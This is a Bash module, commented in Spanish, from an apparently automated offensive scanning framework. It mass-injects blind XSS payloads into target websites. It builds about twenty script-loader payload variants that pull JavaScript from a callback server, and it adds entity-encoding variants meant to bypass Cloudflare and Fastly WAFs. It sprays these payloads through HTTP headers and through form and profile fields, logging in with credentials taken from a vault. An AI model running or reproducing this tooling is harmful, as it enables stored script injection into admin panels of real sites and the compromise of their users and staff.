#!/usr/bin/env bash
# ============================================================
#  modules/27_blind_xss.sh
#  Fase 27: Inyección de Blind XSS con payloads identificados
#
#  Cada payload tiene un ID único que permite saber exactamente
#  de dónde viene cuando se dispara en un panel de admin:
#
#    payload_id = md5(dominio|subdominio|campo|timestamp)[0:8]
#    payload    = <script src="https://xss.tuserver.com/a3f7b2c1.js"></script>
#
#  Campos objetivo (alto riesgo de Blind XSS):
#    - User-Agent header         → logs de acceso, paneles
#    - Referer header            → analytics, sistemas de soporte
#    - X-Forwarded-For           → logs de infraestructura
#    - Campos de nombre/bio      → perfil de usuario → panel admin
#    - Campos de comentario      → sistema de tickets, soporte
#    - Subject de contacto       → bandeja de entrada del soporte
#    - Import de archivos CSV    → parsers con preview en admin
#    - Campos de empresa/cargo   → CRMs, paneles internos
#
#  Requiere: EZXSS_URL y EZXSS_DOMAIN en config.env
# ============================================================

MODULE_NAME="blind_xss"
MODULE_DESC="Blind XSS con payloads identificados"

# ── Verificar configuración de servidor BXSS ─────────────────
# Soporta servidor standalone (BXSS_SERVER_DOMAIN) o EZXSS legacy
_blindxss_check_config() {
  if [[ -n "${BXSS_SERVER_DOMAIN:-}" ]]; then
    # Servidor standalone propio
    EZXSS_DOMAIN="${BXSS_SERVER_DOMAIN}"
    return 0
  fi
  if [[ -z "${EZXSS_DOMAIN:-}" ]] || [[ -z "${EZXSS_URL:-}" ]]; then
    log_warn "Blind XSS no configurado — configura BXSS_SERVER_DOMAIN o EZXSS_DOMAIN en config.env"
    log_info "Servidor standalone: bash blindxss/start_listener.sh"
    log_info "EZXSS legacy: sudo bash blindxss/setup_ezxss.sh"
    return 1
  fi
  return 0
}

# ── Generar payload ID único ──────────────────────────────────
# payload_id = primeros 8 chars de md5(domain|sub|field|ts)
_gen_payload_id() {
  local DOMAIN="$1" SUB="$2" FIELD="$3"
  echo -n "${DOMAIN}|${SUB}|${FIELD}|$(date +%s%N)" | \
    md5sum | cut -c1-8
}

# ── Detectar WAF y elegir codificación óptima ─────────────────
# Envía un canary con <script> raw; si el WAF devuelve 4xx, cambia
# a HTML entity encoding (&#x3C; &#x3E;) que bypasea Fastly/Cloudflare.
# Cachea el resultado por subdominio para no repetir la sonda.
declare -gA _WAF_ENCODE_CACHE

_waf_needs_encoding() {
  local URL="$1" PROXY_FLAG="$2"
  local HOST
  HOST=$(echo "$URL" | sed 's|https\?://||;s|/.*||')

  if [[ -v _WAF_ENCODE_CACHE["$HOST"] ]]; then
    [[ "${_WAF_ENCODE_CACHE[$HOST]}" == "1" ]]
    return $?
  fi

  local STATUS
  STATUS=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}" \
    -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d '{"q":"<script>alert(1)</script>"}' \
    ${PROXY_FLAG} 2>/dev/null)

  if [[ "$STATUS" == "406" || "$STATUS" == "403" ]]; then
    _WAF_ENCODE_CACHE["$HOST"]="1"
    log_info "  WAF detectado en $HOST (HTTP $STATUS) — activando entity encoding"
    return 0
  else
    _WAF_ENCODE_CACHE["$HOST"]="0"
    return 1
  fi
}

# ── Generar variantes del payload ─────────────────────────────
# Emite ~20 variantes ordenadas de más a menos probable.
# Cubre contextos: HTML directo, valor de atributo (break-out),
# event handlers, JS string, href/action, y bypass de WAF.
#
# Diseño: mismo payload_id en todas → cualquier variante que dispare
# manda el mismo callback. El caller elige cuántas probar.
_gen_payloads() {
  local PAYLOAD_ID="$1"
  local URL="${2:-}"
  local PROXY_FLAG="${3:-}"
  local D="${BXSS_SERVER_DOMAIN:-${EZXSS_DOMAIN}}"

  local CB="https://${D}/${PAYLOAD_ID}.js"
  local CB_REL="//${D}/${PAYLOAD_ID}.js"

  # Loader compacto para event handlers (comillas simples — safe en attr doble)
  local JSL="var s=document.createElement('script');s.src='${CB}';document.head.appendChild(s)"
  # Versión con backtick para contextos donde tanto ' como " están escapados
  local JSL_BT="var s=document.createElement(\`script\`);s.src=\`${CB}\`;document.head.appendChild(s)"
  # Versión eval(atob) para contextos de JS string
  local CB_B64
  CB_B64=$(printf '%s' "${JSL}" | base64 -w0 2>/dev/null || printf '%s' "${JSL}" | base64)
  local JSL_EVAL="eval(atob('${CB_B64}'))"

  # ── WAF detectado: variantes entity-encoded ────────────────
  if [[ -n "$URL" ]] && _waf_needs_encoding "$URL" "$PROXY_FLAG"; then
    # Codificar los chars < > " = que los WAF de nivel básico buscan
    local ENC_CB
    ENC_CB=$(printf '%s' "$CB" | sed 's|:|&#x3A;|g;s|/|&#x2F;|g')
    cat << PAYLOADS
&#x3C;script src=&#x22;${CB}&#x22;&#x3E;&#x3C;&#x2F;script&#x3E;
&#x22;&#x3E;&#x3C;script src=&#x22;${CB}&#x22;&#x3E;&#x3C;&#x2F;script&#x3E;
&#x3C;img src&#x3D;x onerror&#x3D;&#x22;${JSL}&#x22;&#x3E;
&#x3C;svg onload&#x3D;&#x22;${JSL}&#x22;&#x3E;
&#x3C;details open ontoggle&#x3D;&#x22;${JSL}&#x22;&#x3E;
<script src="${CB}"></script>
PAYLOADS
    return
  fi

  # ── Sin WAF / WAF no detectado: variantes completas ───────
  cat << PAYLOADS
<script src="${CB}"></script>
"><script src="${CB}"></script>
'><script src="${CB}"></script>
<script/src="${CB}"></script>
<ScRiPt SrC="${CB}"></ScRiPt>
<script	src="${CB}"></script>
<script src=${CB_REL}></script>
"><script src=${CB_REL}></script>
<img src=x onerror="${JSL}">
"><img src=x onerror="${JSL}">
'><img src=x onerror='${JSL}'>
<svg onload="${JSL}">
"><svg onload="${JSL}">
<details open ontoggle="${JSL}">
<input autofocus onfocus="${JSL}">
<body onload="${JSL}">
<video><source onerror="${JSL}">
<iframe onload="${JSL}" style=display:none>
--><script src="${CB}"></script>
]]><script src="${CB}"></script>
javascript:${JSL_EVAL}
';${JSL_EVAL}//
";${JSL_EVAL}//
\`);${JSL_EVAL}//
PAYLOADS
}

# ── Registrar payload en DB ───────────────────────────────────
_register_payload() {
  local DOMAIN_ID="$1" PAYLOAD_ID="$2" SUBDOMAIN="$3"
  local TARGET_URL="$4" FIELD_TYPE="$5" FIELD_NAME="$6"

  sqlite3 "$DB_PATH" \
    "INSERT OR IGNORE INTO blindxss_payloads
     (domain_id, payload_id, subdomain, target_url, field_type, field_name)
     VALUES(${DOMAIN_ID},'${PAYLOAD_ID}','${SUBDOMAIN//\'/\'\'}',
            '${TARGET_URL//\'/\'\'}','${FIELD_TYPE}',
            '${FIELD_NAME//\'/\'\'}');" 2>/dev/null || true
}

# ── Inyectar en headers HTTP ──────────────────────────────────
# Por cada header, enviamos 3 variantes en paralelo:
#   1. Raw <script src> — el más efectivo si el admin panel renderiza el header
#   2. Break-out + script — si el valor se pone dentro de un atributo HTML
#   3. SVG onload — si hay DOMPurify que filtra <script> pero no SVG
_inject_headers() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3" SUBDOMAIN="$4"
  local PROXY_FLAG="$5"
  local D="${BXSS_SERVER_DOMAIN:-${EZXSS_DOMAIN}}"

  local HEADERS_TO_TEST=(
    "User-Agent"
    "Referer"
    "X-Forwarded-For"
    "X-Forwarded-Host"
    "X-Original-URL"
    "X-Custom-Header"
    "CF-Connecting-IP"
    "True-Client-IP"
    "X-Real-IP"
    "Contact"
    "From"
    "X-Filename"
    "Accept-Language"
  )

  for HEADER in "${HEADERS_TO_TEST[@]}"; do
    local PID
    PID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "header_${HEADER}")
    local CB="https://${D}/${PID}.js"
    local JSL="var s=document.createElement('script');s.src='${CB}';document.head.appendChild(s)"

    # Las 3 variantes se envían como requests separados al mismo endpoint.
    # Mismo PID → cualquiera que dispare manda el mismo callback.
    local VARIANTS=(
      "<script src=\"${CB}\"></script>"
      "\"><script src=\"${CB}\"></script>"
      "<svg onload=\"${JSL}\">"
    )

    local REGISTERED=false
    for VARIANT in "${VARIANTS[@]}"; do
      local STATUS
      STATUS=$(curl -sL --max-time 10 \
        -o /dev/null -w "%{http_code}" \
        -H "${HEADER}: ${VARIANT}" \
        ${PROXY_FLAG} \
        "$URL" 2>/dev/null)

      if [[ "$STATUS" =~ ^[2345] ]]; then
        if ! $REGISTERED; then
          _register_payload "$DOMAIN_ID" "$PID" "$SUBDOMAIN" \
            "$URL" "header" "$HEADER"
          log_info "  ↪ Header $HEADER — 3 variantes inyectadas ($PID)"
          REGISTERED=true
        fi
      fi
    done
  done
}

# ── Inyectar en formularios ───────────────────────────────────
_inject_forms() {
  local URL="$1" DOMAIN_ID="$2" DOMAIN="$3" SUBDOMAIN="$4"
  local PROXY_FLAG="$5"

  # Descargar la página y extraer formularios
  local HTML
  HTML=$(curl -sL --max-time 10 ${PROXY_FLAG} "$URL" 2>/dev/null | head -c 100000)
  [[ -z "$HTML" ]] && return

  # Extraer campos de formularios de alto valor
  # Campos jugosos: name, bio, comment, subject, message, company, title
  local JUICY_FIELD_PATTERNS=(
    "name" "username" "display_name" "full_name" "first_name" "last_name"
    "bio" "about" "description" "comment" "message" "body" "content"
    "subject" "title" "company" "organization" "address" "feedback"
    "review" "note" "tag" "label" "reason"
  )

  # Identificar campos del formulario
  while IFS= read -r INPUT_TAG; do
    local FIELD_NAME
    FIELD_NAME=$(echo "$INPUT_TAG" | grep -oiP "name=[\"'][^\"']+[\"']" | \
      sed "s/name=[\"']//;s/[\"']//" | head -1 | tr '[:upper:]' '[:lower:]')
    [[ -z "$FIELD_NAME" ]] && continue

    # Solo campos jugosos
    local IS_JUICY=false
    for PAT in "${JUICY_FIELD_PATTERNS[@]}"; do
      echo "$FIELD_NAME" | grep -qi "$PAT" && IS_JUICY=true && break
    done
    $IS_JUICY || continue

    local PAYLOAD_ID
    PAYLOAD_ID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "field_${FIELD_NAME}")

    local FORM_ACTION
    FORM_ACTION=$(echo "$HTML" | grep -oiP "(?<=action=[\"'])[^\"']+" | head -1)
    [[ -z "$FORM_ACTION" ]] && FORM_ACTION="$URL"
    echo "$FORM_ACTION" | grep -qP '^https?' || \
      FORM_ACTION="$(echo "$URL" | grep -oP 'https?://[^/]+')"

    # Probar top 5 variantes del payload — mismo PID, distintos vectores.
    # Para stored XSS blind, el servidor acepta todas; disparará la que
    # el admin panel renderice sin sanitizar.
    local N_VAR=0 REGISTERED=false
    while IFS= read -r PAYLOAD && [[ $N_VAR -lt 5 ]]; do
      [[ -z "$PAYLOAD" ]] && continue
      ((N_VAR++))

      local STATUS
      STATUS=$(curl -sL --max-time 10 \
        -o /dev/null -w "%{http_code}" \
        -X POST "$FORM_ACTION" \
        --data-urlencode "${FIELD_NAME}=${PAYLOAD}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        ${PROXY_FLAG} 2>/dev/null)

      if [[ "$STATUS" =~ ^[2345] ]]; then
        if ! $REGISTERED; then
          _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
            "$URL" "form_field" "$FIELD_NAME"
          log_info "  ↪ Campo '$FIELD_NAME' — ${N_VAR} variantes inyectadas ($PAYLOAD_ID)"
          REGISTERED=true
        fi
      fi
    done < <(_gen_payloads "$PAYLOAD_ID" "$URL" "$PROXY_FLAG")

  done < <(echo "$HTML" | grep -ioP '<input[^>]+>' | head -20)

  # También textareas (comentarios, mensajes)
  while IFS= read -r TA_TAG; do
    local TA_NAME
    TA_NAME=$(echo "$TA_TAG" | grep -oiP "name=[\"'][^\"']+[\"']" | \
      sed "s/name=[\"']//;s/[\"']//" | head -1 | tr '[:upper:]' '[:lower:]')
    [[ -z "$TA_NAME" ]] && continue

    local IS_JUICY=false
    for PAT in "${JUICY_FIELD_PATTERNS[@]}"; do
      echo "$TA_NAME" | grep -qi "$PAT" && IS_JUICY=true && break
    done
    $IS_JUICY || continue

    local PAYLOAD_ID
    PAYLOAD_ID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "textarea_${TA_NAME}")

    local FORM_ACTION
    FORM_ACTION=$(echo "$HTML" | grep -oiP "(?<=action=[\"'])[^\"']+" | head -1)
    [[ -z "$FORM_ACTION" ]] && FORM_ACTION="$URL"
    echo "$FORM_ACTION" | grep -qP '^https?' || \
      FORM_ACTION="$(echo "$URL" | grep -oP 'https?://[^/]+')"

    local N_VAR=0 REGISTERED=false
    while IFS= read -r PAYLOAD && [[ $N_VAR -lt 5 ]]; do
      [[ -z "$PAYLOAD" ]] && continue
      ((N_VAR++))

      local STATUS
      STATUS=$(curl -sL --max-time 10 \
        -o /dev/null -w "%{http_code}" \
        -X POST "$FORM_ACTION" \
        --data-urlencode "${TA_NAME}=${PAYLOAD}" \
        ${PROXY_FLAG} 2>/dev/null)

      if [[ "$STATUS" =~ ^[2345] ]]; then
        if ! $REGISTERED; then
          _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
            "$URL" "textarea" "$TA_NAME"
          log_info "  ↪ Textarea '$TA_NAME' — ${N_VAR} variantes inyectadas ($PAYLOAD_ID)"
          REGISTERED=true
        fi
      fi
    done < <(_gen_payloads "$PAYLOAD_ID" "$URL" "$PROXY_FLAG")

  done < <(echo "$HTML" | grep -ioP '<textarea[^>]+>' | head -10)
}

# ── Inyectar en campos de perfil autenticado ──────────────────
_inject_profile_fields() {
  local DOMAIN_ID="$1" DOMAIN="$2" SUBDOMAIN="$3" PROXY_FLAG="$4"

  # Obtener credenciales del vault para este subdominio
  local HAS_CREDS
  HAS_CREDS=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM auth_credentials
     WHERE domain_id=${DOMAIN_ID}
       AND subdomain='${SUBDOMAIN//\'/\'\'}' AND valid=1;" 2>/dev/null || echo 0)

  [[ "$HAS_CREDS" -lt 1 ]] && return

  log_info "  Credenciales disponibles — inyectando en perfil autenticado..."

  local CRED_ROW
  CRED_ROW=$(sqlite3 "$DB_PATH" \
    "SELECT username, password_enc, app_url FROM auth_credentials
     WHERE domain_id=${DOMAIN_ID}
       AND subdomain='${SUBDOMAIN//\'/\'\'}' AND valid=1
     LIMIT 1;" 2>/dev/null)
  [[ -z "$CRED_ROW" ]] && return

  local USERNAME PASSWORD_ENC APP_URL
  IFS='|' read -r USERNAME PASSWORD_ENC APP_URL <<< "$CRED_ROW"

  # Descifrar password del vault
  local PASSWORD
  PASSWORD=$(python3 -c "
import sys
sys.path.insert(0, '$(dirname "$0")/../core')
from vault import decrypt
print(decrypt('${PASSWORD_ENC//\'/\\\'}'))
" 2>/dev/null)
  [[ -z "$PASSWORD" ]] && return

  # Login
  local COOKIE_JAR
  COOKIE_JAR=$(mktemp /tmp/hackeadora_bxss_XXXX)

  curl -sL --max-time 15 \
    -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -X POST "$APP_URL" \
    --data-urlencode "username=${USERNAME}" \
    --data-urlencode "password=${PASSWORD}" \
    ${PROXY_FLAG} \
    -o /dev/null 2>/dev/null

  # Buscar URLs de perfil/settings
  local PROFILE_URLS
  PROFILE_URLS=$(sqlite3 "$DB_PATH" \
    "SELECT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${SUBDOMAIN}%'
       AND (url LIKE '%/profile%' OR url LIKE '%/settings%'
            OR url LIKE '%/account%' OR url LIKE '%/user%'
            OR url LIKE '%/edit%' OR url LIKE '%/preferences%')
     LIMIT 5;" 2>/dev/null)

  while IFS= read -r PROFILE_URL; do
    [[ -z "$PROFILE_URL" ]] && continue

    local HTML
    HTML=$(curl -sL --max-time 10 \
      -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
      ${PROXY_FLAG} "$PROFILE_URL" 2>/dev/null | head -c 100000)
    [[ -z "$HTML" ]] && continue

    # Inyectar en campos de perfil
    for FIELD in "name" "bio" "about" "display_name" "company" "website" "location"; do
      local FIELD_EXISTS
      FIELD_EXISTS=$(echo "$HTML" | grep -c "name=[\"']${FIELD}[\"']" 2>/dev/null || echo 0)
      [[ "$FIELD_EXISTS" -lt 1 ]] && continue

      local PAYLOAD_ID
      PAYLOAD_ID=$(_gen_payload_id "$DOMAIN" "$SUBDOMAIN" "profile_${FIELD}")

      local PAYLOAD
      PAYLOAD='"><script src="https://'"${EZXSS_DOMAIN}/${PAYLOAD_ID}"'.js"></script>'

      local STATUS
      STATUS=$(curl -sL --max-time 10 \
        -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        -X POST "$PROFILE_URL" \
        --data-urlencode "${FIELD}=${PAYLOAD}" \
        ${PROXY_FLAG} \
        -o /dev/null -w "%{http_code}" 2>/dev/null)

      if [[ "$STATUS" =~ ^[2345] ]]; then
        _register_payload "$DOMAIN_ID" "$PAYLOAD_ID" "$SUBDOMAIN" \
          "$PROFILE_URL" "profile_field" "$FIELD"
        log_info "  ↪ Payload en perfil autenticado campo '$FIELD' ($PAYLOAD_ID)"
      fi
      sleep 1
    done
  done <<< "$PROFILE_URLS"

  rm -f "$COOKIE_JAR"
  PASSWORD=""  # Limpiar de memoria
}

# ── Función principal ─────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 27 — $MODULE_DESC: $DOMAIN"

  if ! _blindxss_check_config; then
    log_ok "$MODULE_DESC saltado — EZXSS no configurado"
    return 0
  fi

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  log_info "EZXSS: https://${EZXSS_DOMAIN}"
  log_info "Payloads se identificarán con 8-char hash único por campo"

  local TOTAL_INJECTED=0

  # ── 1. Headers HTTP — en todas las URLs con formularios ────
  log_info "Inyectando en headers HTTP..."
  local FORM_URLS
  FORM_URLS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM login_forms
     WHERE domain_id=${DOMAIN_ID}
     UNION
     SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND (url LIKE '%contact%' OR url LIKE '%support%'
            OR url LIKE '%feedback%' OR url LIKE '%submit%'
            OR url LIKE '%register%' OR url LIKE '%signup%')
     LIMIT 20;" 2>/dev/null)

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    local SUB
    SUB=$(echo "$URL" | sed 's|https\?://||;s|/.*||')
    _inject_headers "$URL" "$DOMAIN_ID" "$DOMAIN" "$SUB" "$CURL_PROXY"
    ((TOTAL_INJECTED++))
  done <<< "$FORM_URLS"

  # ── 2. Formularios descubiertos por el crawler ─────────────
  log_info "Inyectando en formularios web..."
  local ALL_FORM_URLS
  ALL_FORM_URLS=$(sqlite3 "$DB_PATH" \
    "SELECT url FROM login_forms WHERE domain_id=${DOMAIN_ID}
     UNION
     SELECT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND (url LIKE '%/contact%' OR url LIKE '%/feedback%'
            OR url LIKE '%/register%' OR url LIKE '%/profile%'
            OR url LIKE '%/settings%' OR url LIKE '%/comment%'
            OR url LIKE '%/review%' OR url LIKE '%/support%')
     LIMIT 30;" 2>/dev/null)

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    local SUB
    SUB=$(echo "$URL" | sed 's|https\?://||;s|/.*||')
    _inject_forms "$URL" "$DOMAIN_ID" "$DOMAIN" "$SUB" "$CURL_PROXY"
    ((TOTAL_INJECTED++))
  done <<< "$ALL_FORM_URLS"

  # ── 3. Perfil autenticado (si hay credenciales en vault) ───
  log_info "Comprobando credenciales para inyección en perfil..."
  local ALIVE_SUBS
  ALIVE_SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive';" 2>/dev/null)

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    _inject_profile_fields "$DOMAIN_ID" "$DOMAIN" "$SUB" "$CURL_PROXY"
  done <<< "$ALIVE_SUBS"

  # ── Resumen y Telegram ─────────────────────────────────────
  local PAYLOAD_COUNT
  PAYLOAD_COUNT=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM blindxss_payloads
     WHERE domain_id=${DOMAIN_ID} AND fired=0;" 2>/dev/null || echo 0)

  local LISTENER_INFO
  if [[ -n "${BXSS_SERVER_DOMAIN:-}" ]]; then
    LISTENER_INFO="Servidor propio activo"
  else
    LISTENER_INFO="Monitor: blindxss_callback.py --poll"
  fi

  _telegram_send "🎯 *Blind XSS — Payloads inyectados*
🌐 \`${DOMAIN}\`
💉 Payloads activos: \`${PAYLOAD_COUNT}\`
🔍 Servidor: \`https://${EZXSS_DOMAIN}\`
⏳ Esperando callbacks...
💡 ${LISTENER_INFO}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

  log_ok "$MODULE_DESC completado: $PAYLOAD_COUNT payloads activos esperando callback"
  log_info "Monitor: python3 core/blindxss_callback.py --poll"
}
